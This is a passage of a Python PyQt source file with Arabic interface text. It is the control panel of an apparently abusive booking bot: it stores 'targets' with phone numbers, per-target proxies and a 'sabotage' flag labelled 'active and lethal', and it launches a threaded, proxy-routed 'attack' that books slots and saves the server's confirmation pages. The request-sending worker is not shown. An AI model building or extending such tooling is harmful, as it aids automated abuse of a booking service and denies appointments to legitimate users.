        self.btn_add_save.setText("💾 حفظ التعديلات")
        self.btn_add_save.setStyleSheet("background-color: #8957e5; color: white; font-size: 14px; padding: 12px;")
        self.btn_cancel_edit.setVisible(True)
        self.log("INFO", f"جاري تعديل المعاملة رقم [{tid}] - {target_data[1]}")


    def cancel_edit(self):
        """إلغاء وضع التعديل والعودة لوضع الإضافة"""
        self.editing_tid = None
        self._clear_inputs()
        self.group_input.setTitle(" ➕ إضافة / تعديل هدف عملياتي")
        self.btn_add_save.setText("⚙️ حقن وضخ الهدف في مصفوفة الانتظار")
        self.btn_add_save.setStyleSheet("background-color: #1f6feb; color: white; font-size: 14px; padding: 12px;")
        self.btn_cancel_edit.setVisible(False)

    def load_data(self):
        self.table.setRowCount(0)
        all_rows = self.db.get_all()

        for row in all_rows:
            r = self.table.rowCount()
            self.table.insertRow(r)

            # الترتيب: id, name, phone, target_day, image_path, tactic_mode, sabotage_enabled, proxy, status, reference_id
            ui_mapping = [
                str(row[0]),
                str(row[1]),
                str(row[2]),
                str(row[3]),
                str(row[4]),
                str(row[5]),
                "⚠️ نشط ومميت" if row[6] else "❌ غير نشط",
                str(row[7]) if row[7] else "عام",
                str(row[8]),
                str(row[9])
            ]

            for col_idx, text_val in enumerate(ui_mapping):
                item = QTableWidgetItem(text_val)
                item.setFlags(item.flags() & ~Qt.ItemFlag.ItemIsEditable)

                if col_idx == 6:
                    item.setForeground(QColor("#f85149") if row[6] else QColor("#8b949e"))
                elif col_idx == 7:
                    item.setForeground(QColor("#a5d6ff"))
                elif col_idx == 8:
                    if "نجاح" in text_val or "✅" in text_val:
                        item.setForeground(QColor("#56d364"))
                    elif "فشل" in text_val or "❌" in text_val or "خطأ" in text_val:
                        item.setForeground(QColor("#ff7b72"))
                    else:
                        item.setForeground(QColor("#ffea7f"))

                self.table.setItem(r, col_idx, item)

        self.progress.setMaximum(max(1, self.table.rowCount()))
        self._update_stats_display()


    def open_saved_response_page(self, item):
        row_idx = item.row()
        tid = self.table.item(row_idx, 0).text()
        status_text = self.table.item(row_idx, 8).text()
        ref_text = self.table.item(row_idx, 9).text()

        if "نجاح" in status_text and ref_text:
            expected_file = f"Imperial_Server_Responses/Response_ID_{tid}_Ref_{ref_text}.html"
            if os.path.exists(expected_file):
                self.log("INFO", f"جاري عرض رد السيرفر الأخير وصفحة الـ QR للتعريف [{tid}] عبر المتصفح الافتراضي...")
                webbrowser.open(os.path.abspath(expected_file))
            else:
                QMessageBox.warning(self, "الملف غير موجود",
                                    f"تعذر العثور على ملف الاستجابة المادية في المسار المتوقع:\n{expected_file}")
        else:
            QMessageBox.information(self, "تحليل الاستجابة",
                                    "يمكنك فقط فتح رد الخادم المباشر وصفحة المعاملة للعمليات التي تكللت بالـ 'نجاح' وتملك رقم مرجع.")

    def delete_target(self):
        selected_row = self.table.currentRow()
        if selected_row >= 0:
            tid = int(self.table.item(selected_row, 0).text())
            self.db.delete(tid)
            self.table.removeRow(selected_row)
            self.log("INFO", f"تم إقصاء وحذف الهدف صاحب المعرف الحركي [{tid}] من مصفوفة العرض والمستودع.")
            self._update_stats_display()
        else:
            QMessageBox.information(self, "تنبيه الاختيار", "يرجى تحديد السطر المراد إقصاؤه من جدول العمليات أولاً.")

    def wipe_all(self):
        confirm = QMessageBox.question(self, "تأكيد إبادة البيانات",
                                       "هل أنت متأكد تماماً من تصفير وإبادة كافة الأهداف والبيانات المخزنة؟",
                                       QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
        if confirm == QMessageBox.StandardButton.Yes:
            self.db.wipe()
            self.table.setRowCount(0)
            self.log("WARNING", "تم تفريغ وإبادة مستودع الأهداف بالكامل وإعادة بناء الهياكل الصفرية.")
            self._update_stats_display()


    def start_attack(self):
        if self.table.rowCount() == 0:
            QMessageBox.warning(self, "مصفوفة فارغة", "لا توجد أهداف متاحة للبدء بالهجوم المجدول.")
            return

        # قراءة إعدادات التأخير
        try:
            self.delay_between_transactions = float(self.inp_delay.text().strip())
        except ValueError:
            self.delay_between_transactions = 0

        # التحقق من وضع الإرسال المتتابع
        self.sequential_mode = self.chk_sequential.isChecked()

        # إذا كان الوضع متتابع، نجعل max_threads = 1
        if self.sequential_mode:
            self.max_threads = 1
        else:
            self.max_threads = 5

        self.pending = []
        db_rows = self.db.get_all()

        for r in range(self.table.rowCount()):
            status_item = self.table.item(r, 8)
            if status_item and "نجاح" not in status_item.text():
                if r < len(db_rows):
                    self.pending.append((r, db_rows[r]))

        if not self.pending:
            QMessageBox.information(self, "اكتملت التدفقات", "كافة الأهداف الحالية مسجلة مسبقاً كعمليات ناجحة بالكامل.")
            return

        self.btn_start.setEnabled(False)
        self.done = 0
        self.progress.setMaximum(len(self.pending))
        self.progress.setValue(0)
        self.active = []

        self.log("INFO", f"تم إطلاق صافرة بدء العمليات الحركية المكثفة على {len(self.pending)} هدف مجدول.")
        if self.sequential_mode and self.delay_between_transactions > 0:
            self.log("INFO", f"الوضع المتتابع: تأخير {self.delay_between_transactions} ثانية بين كل معاملة.")
        self._dispatch()


    def _dispatch(self):
        while len(self.active) < self.max_threads and self.pending:
            row, data = self.pending.pop(0)

            # البروكسي العام
            global_proxy = self.inp_global_proxy.text().strip()
            # البروكسي الخاص بالمعاملة (index 7 في data)
            per_tx_proxy = data[7] if len(data) > 7 else ""

            worker = BookingWorker(row, data, global_proxy=global_proxy, per_transaction_proxy=per_tx_proxy)
            worker.update_signal.connect(self._on_worker_update)
            worker.log_signal.connect(self.log)
            worker.finished_signal.connect(self._on_worker_finished)

            self.active.append(worker)
            worker.start()

    def _on_worker_update(self, row, tid, status, ref, is_success):
        if row < self.table.rowCount():
            item_status = QTableWidgetItem(status)
            item_ref = QTableWidgetItem(ref)

            if is_success:
                item_status.setForeground(QColor("#56d364"))
            else:
                item_status.setForeground(QColor("#ffea7f"))

            self.table.setItem(row, 8, item_status)
            self.table.setItem(row, 9, item_ref)
            self._update_stats_display()

    def _on_worker_finished(self, row, tid, status, ref):
        self.db.update_status(tid, status, ref)

        self.active = [w for w in self.active if w.row != row]
        self.done += 1
        self.progress.setValue(self.done)

        self.load_data()

        if self.pending:
            # تأخير بين المعاملات في الوضع المتتابع
            if self.sequential_mode and self.delay_between_transactions > 0:
                QTimer.singleShot(int(self.delay_between_transactions * 1000), self._dispatch)
            else:
                self._dispatch()
        elif not self.active:
            self.btn_start.setEnabled(True)
            self.max_threads = 5
            self.log("SUCCESS", "انتهت كافة العمليات والتدفقات المجدولة بداخل لوحة التحكم بالكامل.")
            QMessageBox.information(self, "اكتمال المهام",
                                    "تم الانتهاء من حجز كافة الأهداف وسحب صفحات الردود الرسمية بنجاح.")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    win = MainWindow()
    win.show()
    sys.exit(app.exec())
